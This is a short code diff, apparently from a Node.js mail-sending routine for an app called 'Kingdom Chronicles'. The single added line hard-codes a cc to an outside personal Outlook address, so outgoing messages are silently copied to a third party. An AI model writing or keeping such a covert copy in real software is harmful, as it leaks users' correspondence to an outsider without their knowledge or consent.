@@ -166,6 +166,7 @@ Timestamp: ${new Date().toLocaleString()}
     const info = await transporter.sendMail({
       from: `"Kingdom Chronicles" <${emailUser}>`,
       to: recipientEmail,
+      cc: 'amosjohnworkspace@outlook.com',
       subject,
       text,
       html,
